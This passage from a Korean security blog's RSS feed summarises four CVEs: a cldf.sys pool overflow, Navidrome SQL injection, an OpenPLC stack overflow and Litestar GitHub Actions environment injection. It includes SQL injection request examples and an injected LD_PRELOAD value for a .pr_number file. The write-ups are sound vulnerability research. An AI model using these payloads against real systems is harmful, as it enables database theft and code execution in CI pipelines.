WPP_GLOBAL_Control != (PDEVICE_OBJECT)&amp;WPP_GLOBAL_Control          &amp;&amp; (HIDWORD(WPP_GLOBAL_Control-&gt;Timer) &amp; <span class="hljs-number">1</span>) != <span class="hljs-number">0</span>          &amp;&amp; BYTE1(WPP_GLOBAL_Control-&gt;Timer) &gt;= <span class="hljs-number">2u</span> )        {          WPP_SF_qqd(            WPP_GLOBAL_Control-&gt;AttachedDevice,            <span class="hljs-number">183</span>i64,            &amp;WPP_78064aab483a35e2f1ef7b76ba44fd52_Traceguids,            a2,            v21,            InformationFile);        }        <span class="hljs-keyword">goto</span> LABEL_93;      }      v24 = PathSize + *(_WORD *)(a2 + <span class="hljs-number">0x40</span>); [<span class="hljs-number">2</span>]</code></pre><p>[1]&#xC5D0;&#xC11C; 8&#xBC14;&#xC774;&#xD2B8; &#xD06C;&#xAE30;&#xC778; int64 &#xD0C0;&#xC785;&#xC758; PathSize&#xC5D0; &#xAE38;&#xC774;&#xB97C; &#xC800;&#xC7A5;&#xD574; &#xBC18;&#xD658;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xBC18;&#xD658;&#xB41C; PathSize&#xB294; [2]&#xC5D0;&#xC11C; &#xC5F0;&#xC0B0;&#xC744; &#xD55C;&#xBC88; &#xAC70;&#xCE58;&#xAC8C; &#xB418;&#xB294;&#xB370; &#xC774; &#xB54C; &#xB450; &#xC22B;&#xC790;&#xB97C; &#xC5F0;&#xC0B0;&#xD574; &#xACB0;&#xACFC;&#xB97C; &#xC800;&#xC7A5;&#xD558;&#xB294; &#xBCC0;&#xC218; v24&#xB294; 2&#xBC14;&#xC774;&#xD06C; &#xD06C;&#xAE30;&#xC758; int16 &#xD0C0;&#xC785;&#xC758; &#xBCC0;&#xC218;&#xB85C; &#xD558;&#xC704; &#xAC12;&#xB4E4;&#xB9CC; &#xC800;&#xC7A5;&#xB418;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;.</p><p>&#xB530;&#xB77C;&#xC11C; PathSize&#xC640;   a2 + 0x40 &#xAC12;&#xC758; &#xD569;&#xC774; 2&#xBC14;&#xC774;&#xD2B8;&#xB97C; &#xD45C;&#xD604;&#xD560; &#xC218; &#xC788;&#xB294; &#xCD5C;&#xB300;&#xAC12;&#xC778; 0xFFFF&#xB97C; &#xB118;&#xC5B4;&#xAC04;&#xB2E4;&#xBA74; Integer Overflow&#xAC00; &#xBC1C;&#xC0DD;&#xD574; &#xC2E4;&#xC81C;&#xBCF4;&#xB2E4; &#xC791;&#xC740; &#xAC12;&#xC774; &#xC800;&#xC7A5;&#xB429;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c">LOWORD(v39) = <span class="hljs-number">0</span>;WORD1(v39) = v24;P = ExAllocatePoolWithTag(PagedPool, v24, &apos;sUsH&apos;); [3]InformationFile = P == <span class="hljs-number">0</span>i64 ? <span class="hljs-number">0xC000009A</span> : <span class="hljs-number">0</span>;HsmDbgBreakOnStatus((<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>)InformationFile);<span class="hljs-keyword">if</span> ( !P ){  <span class="hljs-keyword">if</span> ( WPP_GLOBAL_Control != (PDEVICE_OBJECT)&amp;WPP_GLOBAL_Control    &amp;&amp; (HIDWORD(WPP_GLOBAL_Control-&gt;Timer) &amp; <span class="hljs-number">1</span>) != <span class="hljs-number">0</span>    &amp;&amp; BYTE1(WPP_GLOBAL_Control-&gt;Timer) &gt;= <span class="hljs-number">2u</span> )  {    WPP_SF_qd(      WPP_GLOBAL_Control-&gt;AttachedDevice,      <span class="hljs-number">184</span>i64,      &amp;WPP_78064aab483a35e2f1ef7b76ba44fd52_Traceguids,      a2,      InformationFile);  }  <span class="hljs-keyword">goto</span> LABEL_93;}memmove(P, *(<span class="hljs-keyword">const</span> <span class="hljs-keyword">void</span> **)(a2 + <span class="hljs-number">72</span>), *(<span class="hljs-keyword">unsigned</span> __int16 *)(a2 + <span class="hljs-number">64</span>));LOWORD(v39) = *(_WORD *)(a2 + <span class="hljs-number">64</span>) - <span class="hljs-number">2</span>;memmove((<span class="hljs-keyword">char</span> *)P + (<span class="hljs-keyword">unsigned</span> __int16)v39, Src, (<span class="hljs-keyword">unsigned</span> __int16)PathSize); [<span class="hljs-number">4</span>]</code></pre><p>&#xC5F0;&#xC0B0;&#xB41C; v24&#xB294; [3]&#xC5D0;&#xC11C; Pool&#xC744; &#xD560;&#xB2F9;&#xD558;&#xB294;&#xB370; &#xC0AC;&#xC6A9;&#xB418;&#xB294;&#xB370;, &#xC2E4;&#xC81C; &#xC5F0;&#xC0B0;&#xB41C; &#xAC12;&#xBCF4;&#xB2E4; &#xC791;&#xC740; Pool&#xC774; &#xD560;&#xB2F9;&#xB418;&#xACE0; [4]&#xC5D0;&#xC11C; PathSize &#xB9CC;&#xD07C;&#xC758; &#xB370;&#xC774;&#xD130;&#xB97C; &#xBCF5;&#xC0AC;&#xD558;&#xAC8C; &#xB418;&#xC5B4; Pool Overflow&#xAC00; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xD574;&#xB2F9; &#xCDE8;&#xC57D;&#xC810;&#xC740; RTLUShortAdd &#xD568;&#xC218;&#xB97C; &#xC0AC;&#xC6A9;&#xD574; &#xB450; &#xAC12;&#xC774; &#xB354;&#xD574;&#xC84C;&#xC744; &#xB54C; Overflow&#xAC00; &#xBC1C;&#xC0DD;&#xD558;&#xB294; &#xD655;&#xC778;&#xD558;&#xB294; &#xACFC;&#xC815;&#xC744; &#xCD94;&#xAC00;&#xD574;, Overflow&#xAC00; &#xBC1C;&#xC0DD;&#xD560; &#xACBD;&#xC6B0; USHORT&#xC758; &#xCD5C;&#xB300;&#xAC12;&#xC73C;&#xB85C; &#xC124;&#xC815;&#xB418;&#xB3C4;&#xB85D; &#xC218;&#xC815;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c">InformationFile = RtlUShortAdd(pusResult[<span class="hljs-number">1</span>], (USHORT)PathSize[<span class="hljs-number">0</span>], &amp;pusResult[<span class="hljs-number">1</span>]);</code></pre>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/j0ker/">j0ker</category>
      
      <category domain="https://hackyboiz.github.io/tags/Microsoft/">Microsoft</category>
      
      <category domain="https://hackyboiz.github.io/tags/cldf-sys/">cldf.sys</category>
      
      <category domain="https://hackyboiz.github.io/tags/Cloud-Filter-Driver/">Cloud Filter Driver</category>
      
      <category domain="https://hackyboiz.github.io/tags/Pool-Overflow/">Pool Overflow</category>
      
      <category domain="https://hackyboiz.github.io/tags/CVE-2024-21310/">CVE-2024-21310</category>
      
      
      <comments>https://hackyboiz.github.io/2024/09/28/j0ker/2024-09-28/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] CVE-2024-47062 : Navidrome의 SQL injection 취약점</title>
      <link>https://hackyboiz.github.io/2024/09/25/pwndorei/2024-09-25/</link>
      <guid>https://hackyboiz.github.io/2024/09/25/pwndorei/2024-09-25/</guid>
      <pubDate>Wed, 25 Sep 2024 11:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://github.com/navidrome/navidrome/security/advisorie</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://github.com/navidrome/navidrome/security/advisories/GHSA-58vj-cv5w-v4v6">https://github.com/navidrome/navidrome/security/advisories/GHSA-58vj-cv5w-v4v6</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Navidrome &#x2264; 0.52.5</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Navidrome&#xC740; Go&#xB85C; &#xAC1C;&#xBC1C;&#xB41C; &#xC624;&#xD508;&#xC18C;&#xC2A4; &#xC74C;&#xC545; &#xC2A4;&#xD2B8;&#xB9AC;&#xBC0D; &#xC11C;&#xBC84;&#xC785;&#xB2C8;&#xB2E4;. &#xB2E4;&#xC591;&#xD55C; &#xC6B4;&#xC601;&#xCCB4;&#xC81C;&#xC640; &#xB3C4;&#xCEE4; &#xC774;&#xBBF8;&#xC9C0;&#xB97C; &#xD1B5;&#xD574; &#xC6F9; &#xAE30;&#xBC18;&#xC758; &#xC74C;&#xC545; &#xC2A4;&#xD2B8;&#xB9AC;&#xBC0D; &#xAE30;&#xB2A5;&#xC744; &#xC9C0;&#xC6D0;&#xD558;&#xACE0; &#xC774;&#xB54C; URL &#xD30C;&#xB77C;&#xBBF8;&#xD130;&#xAC00; SQL &#xCFFC;&#xB9AC;&#xC5D0; &#xADF8;&#xB300;&#xB85C; &#xC0AC;&#xC6A9;&#xB418;&#xBA74;&#xC11C; &#xB2E4;&#xC218;&#xC758; SQL Injection &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xC0DD;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xCDE8;&#xC57D;&#xD55C; &#xBC84;&#xC804;&#xC758; Navidrome&#xC5D0;&#xC11C;&#xB294; URL&#xC5D0;&#xC11C; &#xD30C;&#xC2F1;&#xD55C; &#xD30C;&#xB77C;&#xBBF8;&#xD130;&#xB97C; &#xC790;&#xB3D9;&#xC801;&#xC73C;&#xB85C; <code>LIKE</code>&#xB97C; &#xC0AC;&#xC6A9;&#xD574;&#xC11C; SQL &#xCFFC;&#xB9AC;&#xC5D0; &#xCD94;&#xAC00;&#xB418;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC740; HTTP &#xC694;&#xCCAD;&#xC744; &#xD1B5;&#xD574; <code>password LIKE AAA%</code>&#xAC00; &#xC0BD;&#xC785;&#xB418;&#xACE0; &#xC774;&#xB97C; &#xD1B5;&#xD574; <code>password</code>&#xC758; &#xAC12;&#xC744; &#xBE0C;&#xB8E8;&#xD2B8; &#xD3EC;&#xC2F1;&#xD558;&#xB294; &#xAC83;&#xC774; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs pgsql"><span class="hljs-keyword">GET</span> /api/<span class="hljs-keyword">user</span>?_end=<span class="hljs-number">36</span>&amp;_order=<span class="hljs-keyword">DESC</span>&amp;<span class="hljs-keyword">password</span>=AAA%</code></pre><p>&#xB610;&#xD55C; URL &#xD30C;&#xB77C;&#xBBF8;&#xD130;&#xC758; &#xC774;&#xB984;&#xC744; &#xB530;&#xB85C; &#xAC80;&#xC0AC;&#xD558;&#xAC70;&#xB098; escape &#xD558;&#xC9C0; &#xC54A;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC740; HTTP &#xC694;&#xCCAD;&#xC73C;&#xB85C; &#xC784;&#xC758;&#xC758; SQL &#xAD6C;&#xBB38;&#xC744; &#xC2E4;&#xD589;&#xC2DC;&#xD0A4;&#xB294; &#xAC83; &#xB610;&#xD55C; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs pgsql"><span class="hljs-keyword">GET</span> /api/album?_end=<span class="hljs-number">36</span>&amp;_order=<span class="hljs-keyword">DESC</span>&amp;_sort=recently_added&amp;_start=<span class="hljs-number">0</span>&amp;<span class="hljs-keyword">SELECT</span>+*+<span class="hljs-keyword">FROM</span>+<span class="hljs-keyword">USER</span><span class="hljs-comment">--=123 HTTP/1.1</span></code></pre><p>&#xCD94;&#xAC00;&#xC801;&#xC73C;&#xB85C; &#xC0AC;&#xC6A9;&#xC790; &#xC778;&#xC99D; &#xACFC;&#xC815;&#xC5D0;&#xC11C; &#xC0AC;&#xC6A9;&#xB418;&#xB294; &#xC544;&#xB798;&#xC758; &#xD568;&#xC218;&#xC5D0;&#xC11C;&#xB3C4; &#xC7A0;&#xC7AC;&#xC801;&#xC778; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xACAC;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs css"><span class="hljs-selector-tag">func</span> (<span class="hljs-selector-tag">r</span> *<span class="hljs-selector-tag">userRepository</span>) <span class="hljs-selector-tag">FindByUsername</span>(<span class="hljs-selector-tag">username</span> <span class="hljs-selector-tag">string</span>) (<span class="hljs-selector-tag">model</span><span class="hljs-selector-class">.User</span>, <span class="hljs-selector-tag">error</span>) {    <span class="hljs-attribute">sel </span>:= r.<span class="hljs-built_in">newSelect</span>().<span class="hljs-built_in">Columns</span>(<span class="hljs-string">&quot;&quot;</span>).<span class="hljs-built_in">Where</span>(Like{<span class="hljs-string">&quot;user_name&quot;</span>: username})    var usr model.User    err := r.<span class="hljs-built_in">queryOne</span>(sel, &amp;usr)    return &amp;usr, err}</code></pre><p><code>username</code>&#xC5D0; &#xD574;&#xB2F9;&#xD558;&#xB294; &#xC0AC;&#xC6A9;&#xC790;&#xB97C; &#xCC3E;&#xC744; &#xB54C; <code>Like</code>&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xACE0; &#xC788;&#xB294; &#xAC83;&#xC744; &#xBCFC; &#xC218; &#xC788;&#xACE0; &#xC774;&#xB85C; &#xC778;&#xD574; &#xC0AC;&#xC6A9;&#xC790;&#xC758; &#xC774;&#xB984;&#xC5D0; <code>%</code> &#xB4F1;&#xC744; &#xC0AC;&#xC6A9;&#xD574;&#xC11C; &#xB85C;&#xADF8;&#xC778;&#xD558;&#xB294; &#xAC83; &#xD5C8;&#xC6A9;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xACB0;&#xB860;&#xC801;&#xC73C;&#xB85C; &#xACF5;&#xACA9;&#xC790;&#xB294; &#xD574;&#xB2F9; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xC545;&#xC6A9;&#xD558;&#xC5EC; &#xC784;&#xC758;&#xC758; SQL &#xAD6C;&#xBB38;&#xC744; &#xC2E4;&#xD589;&#xD558;&#xACE0; DB&#xC5D0; &#xC800;&#xC7A5;&#xB41C; &#xB370;&#xC774;&#xD130;&#xB97C; &#xC720;&#xCD9C;&#xD558;&#xB294; &#xB4F1;&#xC758; &#xD589;&#xC704;&#xAC00; &#xAC00;&#xB2A5;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/pwndorei/">pwndorei</category>
      
      <category domain="https://hackyboiz.github.io/tags/SQL-injection/">SQL injection</category>
      
      <category domain="https://hackyboiz.github.io/tags/Navidrome/">Navidrome</category>
      
      
      <comments>https://hackyboiz.github.io/2024/09/25/pwndorei/2024-09-25/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] CVE-2024-34026: OpenPLC Stack Buffer Overflow 취약점</title>
      <link>https://hackyboiz.github.io/2024/09/21/l0ch/2024-09-21/</link>
      <guid>https://hackyboiz.github.io/2024/09/21/l0ch/2024-09-21/</guid>
      <pubDate>Sat, 21 Sep 2024 08:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://talosintelligence.com/vulnerability_reports/TALOS</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://talosintelligence.com/vulnerability_reports/TALOS-2024-2005">https://talosintelligence.com/vulnerability_reports/TALOS-2024-2005</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>OpenPLC_v3</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>&#xC624;&#xD508;&#xC18C;&#xC2A4; &#xAE30;&#xBC18;&#xC758; Programmable Logic Controller(PLC)&#xC778; OpenPLC&#xC5D0;&#xC11C; &#xBC1C;&#xC0DD;&#xD558;&#xB294; Stack Buffer Overflow &#xCDE8;&#xC57D;&#xC810;&#xC5D0; &#xB300;&#xD55C; &#xC138;&#xBD80; &#xC815;&#xBCF4;&#xAC00; &#xACF5;&#xAC1C;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>OpenPLC&#xB294; ENIP(EtherNet/IP) &#xB4F1;&#xC758; &#xD504;&#xB85C;&#xD1A0;&#xCF5C;&#xC744; &#xC9C0;&#xC6D0;&#xD558;&#xBA70; &#xD574;&#xB2F9; &#xD504;&#xB85C;&#xD1A0;&#xCF5C;&#xC744; &#xD1B5;&#xD574; &#xC804;&#xC1A1;&#xB418;&#xB294; PCCC(Programmable Controller Communication Commands) &#xBA54;&#xC138;&#xC9C0;&#xB97C; &#xC9C0;&#xC6D0;&#xD569;&#xB2C8;&#xB2E4;.</p><blockquote><p>ENIP(EtherNet/IP): Ethernet Industrial Protocol&#xC744; &#xC758;&#xBBF8;&#xD558;&#xBA70; &#xACF5;&#xD1B5;&#xB41C; &#xC0B0;&#xC5C5; &#xD504;&#xB85C;&#xD1A0;&#xCF5C;&#xC744; &#xD45C;&#xC900; &#xC774;&#xB354;&#xB137; &#xAE30;&#xBC18;&#xC5D0;&#xC11C; &#xC0AC;&#xC6A9;&#xD560; &#xC218; &#xC788;&#xB3C4;&#xB85D; &#xAC1C;&#xBC1C;&#xB41C; &#xC0B0;&#xC5C5; &#xB124;&#xD2B8;&#xC6CC;&#xD06C; &#xD504;&#xB85C;&#xD1A0;&#xCF5C;&#xC784;.</p></blockquote><p>&#xCDE8;&#xC57D;&#xC810;&#xC740; OpenPLC&#xC758; ENIP &#xD504;&#xB85C;&#xD1A0;&#xCF5C; &#xD30C;&#xC11C; &#xD568;&#xC218;&#xC778; <code>processEnipMessage</code> &#xD568;&#xC218;&#xC5D0; &#xC874;&#xC7AC;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">processEnipMessage</span><span class="hljs-params">(<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> *buffer, <span class="hljs-keyword">int</span> buffer_size)</span></span><span class="hljs-function"></span>{    <span class="hljs-comment">// initialize logging system</span>    <span class="hljs-keyword">char</span> log_msg[<span class="hljs-number">1000</span>];    <span class="hljs-keyword">char</span> *p = log_msg;<span class="hljs-comment">//...</span>    <span class="hljs-keyword">if</span> (header.command[<span class="hljs-number">0</span>] == <span class="hljs-number">0x6f</span>)<span class="hljs-comment">// Send RR Data</span>    {        ...    }    <span class="hljs-keyword">else</span>    {        p += <span class="hljs-built_in">sprintf</span>(p, <span class="hljs-string">&quot;Unknown EtherNet/IP request: &quot;</span>);        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; buffer_size; i++)        {            p += <span class="hljs-built_in">sprintf</span>(p, <span class="hljs-string">&quot;%02x &quot;</span>, (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span>)buffer[i]);        }        p += <span class="hljs-built_in">sprintf</span>(p, <span class="hljs-string">&quot;\n&quot;</span>);        <span class="hljs-built_in">log</span>(log_msg);        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;    }</code></pre><p><code>processEnipMessage</code>  &#xD568;&#xC218;&#xC758; &#xC778;&#xC790;&#xB85C; &#xC804;&#xB2EC;&#xB418;&#xB294; <code>buffer</code> &#xBC0F; <code>buffer_size</code>&#xB294; &#xACF5;&#xACA9;&#xC790;&#xAC00; ENIP &#xD504;&#xB85C;&#xD1A0;&#xCF5C; &#xBA54;&#xC138;&#xC9C0;&#xB97C; &#xBCF4;&#xB0B4;&#xB294; &#xAC83;&#xC73C;&#xB85C; &#xC81C;&#xC5B4; &#xAC00;&#xB2A5;&#xD558;&#xBA70;, &#xD568;&#xC218;&#xB294; &#xCC98;&#xB9AC;&#xD558;&#xB294; &#xBA54;&#xC2DC;&#xC9C0;&#xB97C; &#xB85C;&#xAE45;&#xD558;&#xAE30; &#xC704;&#xD574; 1000 bytes &#xD06C;&#xAE30;&#xC758; <code>log_msg</code> &#xC2A4;&#xD0DD; &#xBC84;&#xD37C;&#xB97C; &#xD560;&#xB2F9;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xC774;&#xD6C4; ENIP &#xD5E4;&#xB354;&#xC5D0; &#xD3EC;&#xD568;&#xB41C; Command Code&#xAC00; &#xC720;&#xD6A8;&#xD55C;&#xC9C0; &#xAC80;&#xC0AC;&#xD558;&#xB294;&#xB370;, &#xC774;&#xB54C; Command Code&#xAC00; &#xC720;&#xD6A8;&#xD558;&#xC9C0; &#xC54A;&#xC73C;&#xBA74; else &#xBD84;&#xAE30;&#xC5D0;&#xC11C;  <code>log_msg</code> &#xB97C; &#xC5D0;&#xB7EC; &#xBA54;&#xC138;&#xC9C0;&#xB85C; &#xCC44;&#xC6B0;&#xACE0; &#xC774;&#xD6C4; &#xBA54;&#xC138;&#xC9C0; &#xD06C;&#xAE30;&#xC778; <code>buffer_size</code>&#xB9CC;&#xD07C;&#xC758; &#xACF5;&#xBC31;&#xBB38;&#xC790;&#xB97C; <code>log_msg</code> &#xBC84;&#xD37C;&#xC5D0; &#xC800;&#xC7A5;&#xD569;&#xB2C8;&#xB2E4;. </p><p>&#xC704; &#xACFC;&#xC815;&#xC5D0;&#xC11C; <code>buffer_size</code>&#xAC00; <code>log_msg</code> &#xBC84;&#xD37C; &#xD06C;&#xAE30;&#xBCF4;&#xB2E4; &#xD070;&#xC9C0; &#xAC80;&#xC0AC;&#xD558;&#xC9C0; &#xC54A;&#xC544; &#xB2E4;&#xC74C; &#xC870;&#xAC74;&#xC5D0;&#xC11C; Stack Buffer Overflow &#xD2B8;&#xB9AC;&#xAC70;&#xAC00; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;.</p><ul><li>&#xC720;&#xD6A8;&#xD558;&#xC9C0; &#xC54A;&#xC740; Command Code</li><li>&#xC720;&#xD6A8;&#xD55C; &#xCEA1;&#xC290;&#xD654;&#xB41C; &#xD5E4;&#xB354;</li><li>500 bytes &#xC774;&#xC0C1;&#xC758; &#xCD1D; &#xBA54;&#xC138;&#xC9C0; &#xAE38;&#xC774;</li></ul>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/L0ch/">L0ch</category>
      
      <category domain="https://hackyboiz.github.io/tags/stack-buffer-overflow/">stack buffer overflow</category>
      
      <category domain="https://hackyboiz.github.io/tags/OpenPLC/">OpenPLC</category>
      
      <category domain="https://hackyboiz.github.io/tags/PLC/">PLC</category>
      
      
      <comments>https://hackyboiz.github.io/2024/09/21/l0ch/2024-09-21/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] CVE-2024-42370: Litestar의 Environment Variable Injection로 인한 정보 유출 취약점</title>
      <link>https://hackyboiz.github.io/2024/09/18/ogu123/cve-2024-42370/</link>
      <guid>https://hackyboiz.github.io/2024/09/18/ogu123/cve-2024-42370/</guid>
      <pubDate>Wed, 18 Sep 2024 08:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://github.com/litestar-org/litestar/security/a</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><ul><li><a href="https://github.com/litestar-org/litestar/security/advisories/GHSA-4hq2-rpgc-r8r7#event-274768">https://github.com/litestar-org/litestar/security/advisories/GHSA-4hq2-rpgc-r8r7#event-274768</a></li></ul><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Litestar &lt;= 2.10.0</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Litestar&#xB294; Python &#xAE30;&#xBC18;&#xC758; ASGI(Asynchronous Server Gateway Interface) &#xD504;&#xB808;&#xC784;&#xC6CC;&#xD06C;&#xB85C;, &#xBE44;&#xB3D9;&#xAE30; &#xC6F9; &#xC560;&#xD50C;&#xB9AC;&#xCF00;&#xC774;&#xC158;&#xACFC; API &#xAC1C;&#xBC1C;&#xC5D0; &#xC0AC;&#xC6A9;&#xB429;&#xB2C8;&#xB2E4;.</p><p>&#xCDE8;&#xC57D;&#xC810;&#xC740; <code>docs-preview.yml</code> &#xC6CC;&#xD06C;&#xD50C;&#xB85C;&#xC6B0;&#xC5D0;&#xC11C; &#xBC1C;&#xC0DD;&#xD558;&#xBA70;, Environment Variable Injection&#xC744; &#xD2B8;&#xB9AC;&#xAC70;&#xD574; &#xC815;&#xBCF4; &#xC720;&#xCD9C; &#xBC0F; &#xC800;&#xC7A5;&#xC18C; &#xACF5;&#xACA9;&#xC774; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs dts"><span class="hljs-symbol">on:</span><span class="hljs-symbol">  workflow_run:</span><span class="hljs-symbol">    workflows:</span> [Tests And Linting]<span class="hljs-symbol">    types:</span> [completed]</code></pre><p><code>Tests And Linting</code> &#xC6CC;&#xD06C;&#xD50C;&#xB85C;&#xC6B0;&#xAC00; &#xC644;&#xB8CC;&#xB418;&#xBA74;, <code>docs-preview.yml</code> &#xC6CC;&#xD06C;&#xD50C;&#xB85C;&#xC6B0;&#xAC00; &#xC2E4;&#xD589;&#xB429;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs yaml"><span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">Download</span> <span class="hljs-string">artifact</span><span class="hljs-attr">uses:</span> <span class="hljs-string">dawidd6/action-download-artifact@v6</span><span class="hljs-attr">with:</span>  <span class="hljs-attr">workflow_conclusion:</span> <span class="hljs-string">success</span>  <span class="hljs-attr">run_id:</span> <span class="hljs-string">${{</span> <span class="hljs-string">github.event.workflow_run.id</span> <span class="hljs-string">}}</span>  <span class="hljs-attr">path:</span> <span class="hljs-string">docs-preview</span>  <span class="hljs-attr">name:</span> <span class="hljs-string">docs-preview</span></code></pre><p>&#xC774;&#xB54C; <code>Tests And Linting</code> &#xC6CC;&#xD06C;&#xD50C;&#xB85C;&#xC6B0;&#xC5D0;&#xC11C; &#xC0DD;&#xC131;&#xB41C; &#xC544;&#xD2F0;&#xD329;&#xD2B8;&#xB97C; &#xB2E4;&#xC6B4;&#xB85C;&#xB4DC;&#xD558;&#xACE0; &#xC555;&#xCD95;&#xC744; &#xD574;&#xC81C;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs dockerfile">- name: Set PR number  <span class="hljs-keyword">run</span><span class="bash">: <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;PR_NUMBER=<span class="hljs-subst">$(cat docs-preview/.pr_number)</span>&quot;</span> &gt;&gt; <span class="hljs-variable">$GITHUB_ENV</span></span></code></pre><p>&#xADF8; &#xD6C4; <code>docs-preview/.pr_number</code> &#xD30C;&#xC77C;&#xC758; &#xB0B4;&#xC6A9;&#xC744; &#xC77D;&#xC5B4; <code>PR_NUMBER</code> &#xD658;&#xACBD; &#xBCC0;&#xC218;&#xB85C; &#xC124;&#xC815;&#xD558;&#xACE0; <code>$GITHUB_ENV</code> &#xD30C;&#xC77C;&#xC5D0; &#xC800;&#xC7A5;&#xD569;&#xB2C8;&#xB2E4;.</p><p><code>$GITHUB_ENV</code> &#xD30C;&#xC77C;&#xC740; GitHub Actions&#xC5D0;&#xC11C; &#xD658;&#xACBD; &#xBCC0;&#xC218;&#xB97C; &#xC815;&#xC758;&#xD560; &#xB54C; &#xC0AC;&#xC6A9;&#xD558;&#xB294; &#xD30C;&#xC77C;&#xB85C; <code>KEY=VALUE</code> &#xD615;&#xC2DD;&#xC73C;&#xB85C; &#xAC12;&#xC744; &#xCD94;&#xAC00;&#xD558;&#xBA74;, GitHub Actions&#xB294; &#xC0C8;&#xB85C;&#xC6B4; &#xD658;&#xACBD; &#xBCC0;&#xC218;&#xB85C; &#xC778;&#xC2DD;&#xD574; &#xC0AC;&#xC6A9;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xCDE8;&#xC57D;&#xC810;&#xC740; <code>.pr_number</code> &#xD30C;&#xC77C;&#xC758; &#xB0B4;&#xC6A9;&#xC744; &#xAC80;&#xC99D;&#xD558;&#xC9C0; &#xC54A;&#xC544; &#xACF5;&#xACA9;&#xC790;&#xAC00; <code>.pr_number</code> &#xD30C;&#xC77C;&#xC5D0; &#xC5EC;&#xB7EC; &#xC904;&#xC744; &#xD3EC;&#xD568;&#xC2DC;&#xCF1C; &#xCD94;&#xAC00; &#xD658;&#xACBD; &#xBCC0;&#xC218;&#xB97C; &#xC0DD;&#xC131;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs awk"><span class="hljs-number">111</span>LD_PRELOAD=<span class="hljs-regexp">/home/</span>runner<span class="hljs-regexp">/work/</span>litestar<span class="hljs-regexp">/litestar/i</span>nject.so</code></pre><p>&#xACF5;&#xACA9;&#xC790;&#xB294; 